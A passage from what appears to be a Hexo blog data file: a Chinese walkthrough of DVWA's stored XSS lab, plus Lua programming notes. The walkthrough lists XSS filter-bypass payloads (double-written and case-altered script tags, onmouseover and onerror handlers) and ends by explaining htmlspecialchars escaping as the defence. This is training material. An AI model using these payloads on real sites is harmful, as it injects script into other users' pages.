>alert('添加空格')</script>\n\t\n\t添加换行\n\t<script \n\t>alert('添加换行')</script>\n 3. 替换大小写\n \t<Script>alert('修改S')</script>\n \t\n 先在前端修改对name的输入框属性maxlength=\"100\"，再进行xss注入。\n 也可以像下面的payload一样不使用<script>\n payload：\n <a href=# onmouseover=alert('Name')>ClickHere</a>\n```\n\n### Process:\n\n1. 双写\n\n![006](/img/xss/dvwa/Stored/medium_002.png)\n\n2. 添加空格\n\n![007](/img/xss/dvwa/Stored/medium_003.png)\n\n​       \t\t添加换行\n\n![008](/img/xss/dvwa/Stored/medium_004.png)\n\n3. 替换大小写\n\n   ![009](/img/xss/dvwa/Stored/medium_005.png)\n\n4. 不使用`<script>`\n\n![010](/img/xss/dvwa/Stored/medium_006.png)\n\n## HIGH\n\n### Source:\n\n![011](/img/xss/dvwa/Stored/high_001.png)\n\n### Analysis:\t\n\n```\n过滤了<script,检查了大小写。\n对于这种情况不使用script就行了。\n1.事件触发执行javascript\n\t<a href=# onmouseover=alert('事件')>ClickHere</a>\n2.Src属性\n\t<img src=x onerror=alert('Src属性');>\n照例先进行前端绕过Name的长度限制。\n```\n\n### Process:\n\n1.事件触发执行javascript\n\n![012](/img/xss/dvwa/Stored/high_002.png)\n\n2.Src属性\n\n![013](/img/xss/dvwa/Stored/high_003.png)\n\n## IMPOSSIBLE\n\n### Source:\n\n![014](/img/xss/dvwa/Stored/impossible_001.png)\n\n### Analysis:\t\n\n```\nhtmlspecialchars 将特殊字符转换为 HTML 实体\n& (& 符号)\t&amp;\n\" (双引号)\t&quot;，除非设置了 ENT_NOQUOTES\n' (单引号)\t&#039; \n< (小于)\t&lt;\n> (大于)\t&gt;\n\nImpossible等级的代码使用htmlspecialchars函数把预定义的字符转换为HTML实体，\n防止浏览器将其作为HTML元素。从而防治了XSS利用和危害。\n```\n\n\n\n\n\n","slug":"DVWA-XSS‘存储型’手记","published":1,"updated":"2019-06-19T17:23:13.380Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istbl000b4dsbvov7dvqp","content":"<h1 id=\"DVWA-XSS‘存储型’手记\"><a href=\"#DVWA-XSS‘存储型’手记\" class=\"headerlink\" title=\"DVWA-XSS‘存储型’手记\"></a>DVWA-XSS‘存储型’手记</h1><hr>\n<h2 id=\"LOW\"><a href=\"#LOW\" class=\"headerlink\" title=\"LOW\"></a>LOW</h2><h3 id=\"Source\"><a href=\"#Source\" class=\"headerlink\" title=\"Source:\"></a>Source:</h3><p><img src=\"/img/xss/dvwa/Stored/low_001.png\" alt=\"001\"></p>\n<h3 id=\"Analysis\"><a href=\"#Analysis\" class=\"headerlink\" title=\"Analysis:\"></a>Analysis:</h3><p>先对用户名和消息去除了两边的空格。将消息在输入时转义下存储进数据库。但是二次读取后没有检查,这里Name和Message都可以注入。直接用<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>弹窗测试。</p>\n<p>在前端有对name有长度限制,可以F12开发者模式定位到进行修改。修改maxlength=”100”后可以对name进行xss注入了。</p>\n<p><img src=\"/img/xss/dvwa/Stored/low_002.png\" alt=\"002\"></p>\n<p><img src=\"/img/xss/dvwa/Stored/low_003.png\" alt=\"003\"></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">#</span> <span class=\"attr\">onmouseover</span>=<span class=\"string\">alert(</span>'<span class=\"attr\">Name</span>')&gt;</span>ClickHere<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">#</span> <span class=\"attr\">onmouseover</span>=<span class=\"string\">alert(</span>'<span class=\"attr\">Message</span>')&gt;</span>ClickHere<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Process\"><a href=\"#Process\" class=\"headerlink\" title=\"Process:\"></a>Process:</h3><p><img src=\"/img/xss/dvwa/Stored/low_004.png\" alt=\"004\"></p>\n<h2 id=\"MEDIUM\"><a href=\"#MEDIUM\" class=\"headerlink\" title=\"MEDIUM\"></a>MEDIUM</h2><h3 id=\"Source-1\"><a href=\"#Source-1\" class=\"headerlink\" title=\"Source:\"></a>Source:</h3><p><img src=\"/img/xss/dvwa/Stored/medium_001.png\" alt=\"005\"></p>\n<h3 id=\"Analysis-1\"><a href=\"#Analysis-1\" class=\"headerlink\" title=\"Analysis:\"></a>Analysis:</h3><figure class=\"highlight xquery\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">利用trim函数清除<span class=\"variable\">$message</span>和<span class=\"variable\">$name</span> 两端空格。</span><br><span class=\"line\"><span class=\"variable\">$message</span>用strip_tags函数从字符串中去除 HTML 和 PHP 标记。后再用htmlspecialchars进行转义。把<span class=\"variable\">$message</span>的路堵死了。</span><br><span class=\"line\">将<span class=\"variable\">$name</span>中的<span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">替换为空。</span></span></span><br><span class=\"line\"><span class=\"xml\"></span></span><br><span class=\"line\"><span class=\"xml\">对script替换成空。可以采用多种方法绕过。</span></span><br><span class=\"line\"><span class=\"xml\">1. 双写</span></span><br><span class=\"line\"><span class=\"xml\">\t<span class=\"tag\">&lt;<span class=\"name\">sc</span></span></span><span class=\"xml\"><span class=\"tag\">&lt;<span class=\"attr\">script</span>&gt;</span>ript&gt;alert('双写')<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><span class=\"xml\"></span></span><br><span class=\"line\"><span class=\"xml\">2. 添加空格或换行</span></span><br><span class=\"line\"><span class=\"xml\">\t添加空格</span></span><br><span class=\"line\"><span class=\"xml\">\t<span class=\"tag\">&lt;<span class=\"name\">script</span> &gt;</span><span class=\"actionscript\">alert(<span class=\"string\">'添加空格'</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\t添加换行</span><br><span class=\"line\">\t&lt;script </span><br><span class=\"line\">\t&gt;alert(<span class=\"string\">'添加换行'</span>)&lt;/script&gt;</span><br><span class=\"line\"> <span class=\"number\">3</span>. 替换大小写</span><br><span class=\"line\"> \t<span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">Script</span>&gt;</span><span class=\"actionscript\">alert(<span class=\"string\">'修改S'</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></span><br><span class=\"line\"> \t</span><br><span class=\"line\"> 先在前端修改<span class=\"built_in\">对name</span>的输入框属性maxlength=<span class=\"string\">\"100\"</span>，再进行xss注入。</span><br><span class=\"line\"> 也可以像下面的payload一样不使用<span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span></span><br><span class=\"line\"><span class=\"xml\"> payload：</span></span><br><span class=\"line\"><span class=\"xml\"> <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">#</span> <span class=\"attr\">onmouseover</span>=<span class=\"string\">alert(</span>'<span class=\"attr\">Name</span>')&gt;</span>ClickHere<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Process-1\"><a href=\"#Process-1\" class=\"headerlink\" title=\"Process:\"></a>Process:</h3><ol>\n<li>双写</li>\n</ol>\n<p><img src=\"/img/xss/dvwa/Stored/medium_002.png\" alt=\"006\"></p>\n<ol start=\"2\">\n<li>添加空格</li>\n</ol>\n<p><img src=\"/img/xss/dvwa/Stored/medium_003.png\" alt=\"007\"></p>\n<p>​               添加换行</p>\n<p><img src=\"/img/xss/dvwa/Stored/medium_004.png\" alt=\"008\"></p>\n<ol start=\"3\">\n<li><p>替换大小写</p>\n<p><img src=\"/img/xss/dvwa/Stored/medium_005.png\" alt=\"009\"></p>\n</li>\n<li><p>不使用<code>&lt;script&gt;</code></p>\n</li>\n</ol>\n<p><img src=\"/img/xss/dvwa/Stored/medium_006.png\" alt=\"010\"></p>\n<h2 id=\"HIGH\"><a href=\"#HIGH\" class=\"headerlink\" title=\"HIGH\"></a>HIGH</h2><h3 id=\"Source-2\"><a href=\"#Source-2\" class=\"headerlink\" title=\"Source:\"></a>Source:</h3><p><img src=\"/img/xss/dvwa/Stored/high_001.png\" alt=\"011\"></p>\n<h3 id=\"Analysis-2\"><a href=\"#Analysis-2\" class=\"headerlink\" title=\"Analysis:\"></a>Analysis:</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">过滤了&lt;script,检查了大小写。</span><br><span class=\"line\">对于这种情况不使用script就行了。</span><br><span class=\"line\">1.事件触发执行javascript</span><br><span class=\"line\">\t&lt;a <span class=\"attribute\">href</span>=# <span class=\"attribute\">onmouseover</span>=alert('事件')&gt;ClickHere&lt;/a&gt;</span><br><span class=\"line\">2.Src属性</span><br><span class=\"line\">\t&lt;img <span class=\"attribute\">src</span>=x <span class=\"attribute\">onerror</span>=alert('Src属性');&gt;</span><br><span class=\"line\">照例先进行前端绕过Name的长度限制。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Process-2\"><a href=\"#Process-2\" class=\"headerlink\" title=\"Process:\"></a>Process:</h3><p>1.事件触发执行javascript</p>\n<p><img src=\"/img/xss/dvwa/Stored/high_002.png\" alt=\"012\"></p>\n<p>2.Src属性</p>\n<p><img src=\"/img/xss/dvwa/Stored/high_003.png\" alt=\"013\"></p>\n<h2 id=\"IMPOSSIBLE\"><a href=\"#IMPOSSIBLE\" class=\"headerlink\" title=\"IMPOSSIBLE\"></a>IMPOSSIBLE</h2><h3 id=\"Source-3\"><a href=\"#Source-3\" class=\"headerlink\" title=\"Source:\"></a>Source:</h3><p><img src=\"/img/xss/dvwa/Stored/impossible_001.png\" alt=\"014\"></p>\n<h3 id=\"Analysis-3\"><a href=\"#Analysis-3\" class=\"headerlink\" title=\"Analysis:\"></a>Analysis:</h3><figure class=\"highlight 1c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">htmlspecialchars 将特殊字符转换为 HTML 实体</span><br><span class=\"line\"><span class=\"meta\">&amp; (&amp; 符号)\t&amp;amp;</span></span><br><span class=\"line\"><span class=\"string\">\" (双引号)\t&amp;quot;，除非设置了 ENT_NOQUOTES</span></span><br><span class=\"line\">' (单引号)\t&amp;#039; </span><br><span class=\"line\">&lt; (小于)\t&amp;lt;</span><br><span class=\"line\">&gt; (大于)\t&amp;gt;</span><br><span class=\"line\"></span><br><span class=\"line\">Impossible等级的代码使用htmlspecialchars函数把预定义的字符转换为HTML实体，</span><br><span class=\"line\">防止浏览器将其作为HTML元素。从而防治了XSS利用和危害。</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"DVWA-XSS‘存储型’手记\"><a href=\"#DVWA-XSS‘存储型’手记\" class=\"headerlink\" title=\"DVWA-XSS‘存储型’手记\"></a>DVWA-XSS‘存储型’手记</h1><hr>\n<h2 id=\"LOW\"><a href=\"#LOW\" class=\"headerlink\" title=\"LOW\"></a>LOW</h2><h3 id=\"Source\"><a href=\"#Source\" class=\"headerlink\" title=\"Source:\"></a>Source:</h3><p><img src=\"/img/xss/dvwa/Stored/low_001.png\" alt=\"001\"></p>\n<h3 id=\"Analysis\"><a href=\"#Analysis\" class=\"headerlink\" title=\"Analysis:\"></a>Analysis:</h3><p>先对用户名和消息去除了两边的空格。将消息在输入时转义下存储进数据库。但是二次读取后没有检查,这里Name和Message都可以注入。直接用<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>弹窗测试。</p>\n<p>在前端有对name有长度限制,可以F12开发者模式定位到进行修改。修改maxlength=”100”后可以对name进行xss注入了。</p>\n<p><img src=\"/img/xss/dvwa/Stored/low_002.png\" alt=\"002\"></p>\n<p><img src=\"/img/xss/dvwa/Stored/low_003.png\" alt=\"003\"></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">#</span> <span class=\"attr\">onmouseover</span>=<span class=\"string\">alert(</span>'<span class=\"attr\">Name</span>')&gt;</span>ClickHere<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">#</span> <span class=\"attr\">onmouseover</span>=<span class=\"string\">alert(</span>'<span class=\"attr\">Message</span>')&gt;</span>ClickHere<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Process\"><a href=\"#Process\" class=\"headerlink\" title=\"Process:\"></a>Process:</h3><p><img src=\"/img/xss/dvwa/Stored/low_004.png\" alt=\"004\"></p>\n<h2 id=\"MEDIUM\"><a href=\"#MEDIUM\" class=\"headerlink\" title=\"MEDIUM\"></a>MEDIUM</h2><h3 id=\"Source-1\"><a href=\"#Source-1\" class=\"headerlink\" title=\"Source:\"></a>Source:</h3><p><img src=\"/img/xss/dvwa/Stored/medium_001.png\" alt=\"005\"></p>\n<h3 id=\"Analysis-1\"><a href=\"#Analysis-1\" class=\"headerlink\" title=\"Analysis:\"></a>Analysis:</h3><figure class=\"highlight xquery\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">利用trim函数清除<span class=\"variable\">$message</span>和<span class=\"variable\">$name</span> 两端空格。</span><br><span class=\"line\"><span class=\"variable\">$message</span>用strip_tags函数从字符串中去除 HTML 和 PHP 标记。后再用htmlspecialchars进行转义。把<span class=\"variable\">$message</span>的路堵死了。</span><br><span class=\"line\">将<span class=\"variable\">$name</span>中的<span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">替换为空。</span></span></span><br><span class=\"line\"><span class=\"xml\"></span></span><br><span class=\"line\"><span class=\"xml\">对script替换成空。可以采用多种方法绕过。</span></span><br><span class=\"line\"><span class=\"xml\">1. 双写</span></span><br><span class=\"line\"><span class=\"xml\">\t<span class=\"tag\">&lt;<span class=\"name\">sc</span></span></span><span class=\"xml\"><span class=\"tag\">&lt;<span class=\"attr\">script</span>&gt;</span>ript&gt;alert('双写')<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><span class=\"xml\"></span></span><br><span class=\"line\"><span class=\"xml\">2. 添加空格或换行</span></span><br><span class=\"line\"><span class=\"xml\">\t添加空格</span></span><br><span class=\"line\"><span class=\"xml\">\t<span class=\"tag\">&lt;<span class=\"name\">script</span> &gt;</span><span class=\"actionscript\">alert(<span class=\"string\">'添加空格'</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\t添加换行</span><br><span class=\"line\">\t&lt;script </span><br><span class=\"line\">\t&gt;alert(<span class=\"string\">'添加换行'</span>)&lt;/script&gt;</span><br><span class=\"line\"> <span class=\"number\">3</span>. 替换大小写</span><br><span class=\"line\"> \t<span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">Script</span>&gt;</span><span class=\"actionscript\">alert(<span class=\"string\">'修改S'</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></span><br><span class=\"line\"> \t</span><br><span class=\"line\"> 先在前端修改<span class=\"built_in\">对name</span>的输入框属性maxlength=<span class=\"string\">\"100\"</span>，再进行xss注入。</span><br><span class=\"line\"> 也可以像下面的payload一样不使用<span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span></span><br><span class=\"line\"><span class=\"xml\"> payload：</span></span><br><span class=\"line\"><span class=\"xml\"> <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">#</span> <span class=\"attr\">onmouseover</span>=<span class=\"string\">alert(</span>'<span class=\"attr\">Name</span>')&gt;</span>ClickHere<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Process-1\"><a href=\"#Process-1\" class=\"headerlink\" title=\"Process:\"></a>Process:</h3><ol>\n<li>双写</li>\n</ol>\n<p><img src=\"/img/xss/dvwa/Stored/medium_002.png\" alt=\"006\"></p>\n<ol start=\"2\">\n<li>添加空格</li>\n</ol>\n<p><img src=\"/img/xss/dvwa/Stored/medium_003.png\" alt=\"007\"></p>\n<p>​               添加换行</p>\n<p><img src=\"/img/xss/dvwa/Stored/medium_004.png\" alt=\"008\"></p>\n<ol start=\"3\">\n<li><p>替换大小写</p>\n<p><img src=\"/img/xss/dvwa/Stored/medium_005.png\" alt=\"009\"></p>\n</li>\n<li><p>不使用<code>&lt;script&gt;</code></p>\n</li>\n</ol>\n<p><img src=\"/img/xss/dvwa/Stored/medium_006.png\" alt=\"010\"></p>\n<h2 id=\"HIGH\"><a href=\"#HIGH\" class=\"headerlink\" title=\"HIGH\"></a>HIGH</h2><h3 id=\"Source-2\"><a href=\"#Source-2\" class=\"headerlink\" title=\"Source:\"></a>Source:</h3><p><img src=\"/img/xss/dvwa/Stored/high_001.png\" alt=\"011\"></p>\n<h3 id=\"Analysis-2\"><a href=\"#Analysis-2\" class=\"headerlink\" title=\"Analysis:\"></a>Analysis:</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">过滤了&lt;script,检查了大小写。</span><br><span class=\"line\">对于这种情况不使用script就行了。</span><br><span class=\"line\">1.事件触发执行javascript</span><br><span class=\"line\">\t&lt;a <span class=\"attribute\">href</span>=# <span class=\"attribute\">onmouseover</span>=alert('事件')&gt;ClickHere&lt;/a&gt;</span><br><span class=\"line\">2.Src属性</span><br><span class=\"line\">\t&lt;img <span class=\"attribute\">src</span>=x <span class=\"attribute\">onerror</span>=alert('Src属性');&gt;</span><br><span class=\"line\">照例先进行前端绕过Name的长度限制。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Process-2\"><a href=\"#Process-2\" class=\"headerlink\" title=\"Process:\"></a>Process:</h3><p>1.事件触发执行javascript</p>\n<p><img src=\"/img/xss/dvwa/Stored/high_002.png\" alt=\"012\"></p>\n<p>2.Src属性</p>\n<p><img src=\"/img/xss/dvwa/Stored/high_003.png\" alt=\"013\"></p>\n<h2 id=\"IMPOSSIBLE\"><a href=\"#IMPOSSIBLE\" class=\"headerlink\" title=\"IMPOSSIBLE\"></a>IMPOSSIBLE</h2><h3 id=\"Source-3\"><a href=\"#Source-3\" class=\"headerlink\" title=\"Source:\"></a>Source:</h3><p><img src=\"/img/xss/dvwa/Stored/impossible_001.png\" alt=\"014\"></p>\n<h3 id=\"Analysis-3\"><a href=\"#Analysis-3\" class=\"headerlink\" title=\"Analysis:\"></a>Analysis:</h3><figure class=\"highlight 1c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">htmlspecialchars 将特殊字符转换为 HTML 实体</span><br><span class=\"line\"><span class=\"meta\">&amp; (&amp; 符号)\t&amp;amp;</span></span><br><span class=\"line\"><span class=\"string\">\" (双引号)\t&amp;quot;，除非设置了 ENT_NOQUOTES</span></span><br><span class=\"line\">' (单引号)\t&amp;#039; </span><br><span class=\"line\">&lt; (小于)\t&amp;lt;</span><br><span class=\"line\">&gt; (大于)\t&amp;gt;</span><br><span class=\"line\"></span><br><span class=\"line\">Impossible等级的代码使用htmlspecialchars函数把预定义的字符转换为HTML实体，</span><br><span class=\"line\">防止浏览器将其作为HTML元素。从而防治了XSS利用和危害。</span><br></pre></td></tr></table></figure>\n\n"},{"title":"Lua程序设计第4版-笔记","date":"2018-12-21T08:41:33.000Z","_content":"\n# Lua程序设计第4版-笔记\n\n\n## Lua语言入门\n\n### 三目运算\n\n```lua\n((a and b)or c)或(a and b or c)\n--b不等于false时,等价于C语言的a?b:c\n```\n\n\n\n### 惯用写法 x=x or v\n\n```lua\n--等价于\nif not x then x = v end\n```\n\n### type(nil) == nil 疑惑\n\n返回是string类型，用nil做比较应用\"nil\"\n\n```lua\n> type(nil) == nil \nfalse\n> type(nil) == \"nil\" \ntrue\n```\n\n### 编写打印自身名称的程序\n\n```lua\nprint(arg[0])\n--考点在编译器运行代码前会先创建arg表来存储命令行参数。\n```\n\n## 八皇后\n\n### 输出1解\n\naddqueen中添加os.exit()\n\n```lua\n--eight-queen.lua\nN = 8 --棋盘大小\na = {3,7,2,1,8,6,5,4}\n-- 打印棋盘\nfunction printsolution(a)\n\tfor i=1,N do\n\t\tfor j=1,N do\n\t\t\tio.write(a[i]==j and \"X\" or \"-\",\" \")\n\t\tend\n\t\tio.write(\"\\n\")\n\tend\nend\n\n-- 检查当前皇后是否会被攻击，c为列数\nfunction isplaceok(a,n,c)\n\tfor i=1,n-1 do\n\t\tif (a[i]==c) or --同一列\n\t\t   (a[i]-i == c-n) or\t--右下对角线\n\t\t   (a[i]+i==c+n) then   --左下对角线\n\t\t\treturn false --遭受攻击\n\t\tend\n\t\t\n\tend\n\treturn true --不会被攻击\nend\n\n--添加皇后\nfunction addqueen(a,n)\n\tif n > N then\n\t\tprintsolution(a)\n\t\tos.exit()\n\telse\n\t\tfor c=1,N do\n\t\t\tif isplaceok(a,n,c) then\n\t\t\t\ta[n] = c\n\t\t\t\taddqueen(a,n+1)\n\t\t\tend\n\t\tend\n\tend\nend\naddqueen({},1)\n```\n\n## 强制返回一个结果\n\n```lua\n--使用括号强制返回第一个返回值\nfunction foo2() return \"a\", \"b\" end\n```\n\n![001](/img/lua/001.png)\n\n## table.unpack\n\n```lua\n--将列表转化成一组返回值\ntable.unpack({\"Sun\",\"Mon\",\"Tue\",\"Wed\"},2,3)\n\n--结果\nMon\tTue\n```\n\n## 文件操作\n\n### 简单I/O模型\n\n```lua\nio.read(\"a\") --读取整个文件\nio.read(\"l\") --读取下一行（丢弃换行符）\nio.read(\"L\") --读取下一行（保留换行符）\nio.read(\"n\") --读取一个数值\nio.read(num) --以字符串读取num个字符\n\n-- 只读打开指定文件，并将文件设置为当前输入流\nio.input([file])\n\n-- 设置默认输出文件\nio.output([file])\n\n-- 不带参数关闭默认文件\nio.close([file])\n\n-- 不带参数使用默认文件，返回一个迭代器，用在for循环\nio.lines([file])\n\n-- 将字符串或数字写入输出流\nio.write(value)\n\n-- 将换缓冲数据写入文件\nio.flush()\n```\n\n### 完整I/O模型\n\n```lua\n-- 检查错误方法\nlocal f = assert(io.open(filename,mode))\n```\n\nseek获取设置文件位置\n\n```lua\nf:seek(whence,offset)\n-- 返回当前位置1相对于文件开头的偏移\n-- whence指定使用偏移的字符串  \t\t\n-- set文件头 cur当前位置 end文件尾部 \n-- offset 偏移量\n```\n\n### 运行系统命令\n\n```lua\nos.execute 和 io.popen\n```\n\n","source":"_posts/Lua程序设计(第4版)-学习笔记.md","raw":"---\ntitle: Lua程序设计第4版-笔记\ndate: 2018-12-21 16:41:33\ntags: lua\n---\n\n# Lua程序设计第4版-笔记\n\n\n## Lua语言入门\n\n### 三目运算\n\n```lua\n((a and b)or c)或(a and b or c)\n--b不等于false时,等价于C语言的a?b:c\n```\n\n\n\n### 惯用写法 x=x or v\n\n```lua\n--等价于\nif not x then x = v end\n```\n\n### type(nil) == nil 疑惑\n\n返回是string类型，用nil做比较应用\"nil\"\n\n```lua\n> type(nil) == nil \nfalse\n> type(nil) == \"nil\" \ntrue\n```\n\n### 编写打印自身名称的程序\n\n```lua\nprint(arg[0])\n--考点在编译器运行代码前会先创建arg表来存储命令行参数。\n```\n\n## 八皇后\n\n### 输出1解\n\naddqueen中添加os.exit()\n\n```lua\n--eight-queen.lua\nN = 8 --棋盘大小\na = {3,7,2,1,8,6,5,4}\n-- 打印棋盘\nfunction printsolution(a)\n\tfor i=1,N do\n\t\tfor j=1,N do\n\t\t\tio.write(a[i]==j and \"X\" or \"-\",\" \")\n\t\tend\n\t\tio.write(\"\\n\")\n\tend\nend\n\n-- 检查当前皇后是否会被攻击，c为列数\nfunction isplaceok(a,n,c)\n\tfor i=1,n-1 do\n\t\tif (a[i]==c) or --同一列\n\t\t   (a[i]-i == c-n) or\t--右下对角线\n\t\t   (a[i]+i==c+n) then   --左下对角线\n\t\t\treturn false --遭受攻击\n\t\tend\n\t\t\n\tend\n\treturn true --不会被攻击\nend\n\n--添加皇后\nfunction addqueen(a,n)\n\tif n > N then\n\t\tprintsolution(a)\n\t\tos.exit()\n\telse\n\t\tfor c=1,N do\n\t\t\tif isplaceok(a,n,c) then\n\t\t\t\ta[n] = c\n\t\t\t\taddqueen(a,n+1)\n\t\t\tend\n\t\tend\n\tend\nend\naddqueen({},1)\n```\n\n## 强制返回一个结果\n\n```lua\n--使用括号强制返回第一个返回值\nfunction foo2() return \"a\", \"b\" end\n```\n\n![001](/img/lua/001.png)\n\n## table.unpack\n\n```lua\n--将列表转化成一组返回值\ntable.unpack({\"Sun\",\"Mon\",\"Tue\",\"Wed\"},2,3)\n\n--结果\nMon\tTue\n```\n\n## 文件操作\n\n### 简单I/O模型\n\n```lua\nio.read(\"a\") --读取整个文件\nio.read(\"l\") --读取下一行（丢弃换行符）\nio.read(\"L\") --读取下一行（保留换行符）\nio.read(\"n\") --读取一个数值\nio.read(num) --以字符串读取num个字符\n\n-- 只读打开指定文件，并将文件设置为当前输入流\nio.input([file])\n\n-- 设置默认输出文件\nio.output([file])\n\n-- 不带参数关闭默认文件\nio.close([file])\n\n-- 不带参数使用默认文件，返回一个迭代器，用在for循环\nio.lines([file])\n\n-- 将字符串或数字写入输出流\nio.write(value)\n\n-- 将换缓冲数据写入文件\nio.flush()\n```\n\n### 完整I/O模型\n\n```lua\n-- 检查错误方法\nlocal f = assert(io.open(filename,mode))\n```\n\nseek获取设置文件位置\n\n```lua\nf:seek(whence,offset)\n-- 返回当前位置1相对于文件开头的偏移\n-- whence指定使用偏移的字符串  \t\t\n-- set文件头 cur当前位置 end文件尾部 \n-- offset 偏移量\n```\n\n### 运行系统命令\n\n```lua\nos.execute 和 io.popen\n```\n\n","slug":"Lua程序设计(第4版)-学习笔记","published":1,"updated":"2019-06-19T17:23:13.381Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istbn000f4dsbuxpytiwk","content":"<h1 id=\"Lua程序设计第4版-笔记\"><a href=\"#Lua程序设计第4版-笔记\" class=\"headerlink\" title=\"Lua程序设计第4版-笔记\"></a>Lua程序设计第4版-笔记</h1><h2 id=\"Lua语言入门\"><a href=\"#Lua语言入门\" class=\"headerlink\" title=\"Lua语言入门\"></a>Lua语言入门</h2><h3 id=\"三目运算\"><a href=\"#三目运算\" class=\"headerlink\" title=\"三目运算\"></a>三目运算</h3><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">((a <span class=\"keyword\">and</span> b)<span class=\"keyword\">or</span> c)或(a <span class=\"keyword\">and</span> b <span class=\"keyword\">or</span> c)</span><br><span class=\"line\"><span class=\"comment\">--b不等于false时,等价于C语言的a?b:c</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"惯用写法-x-x-or-v\"><a 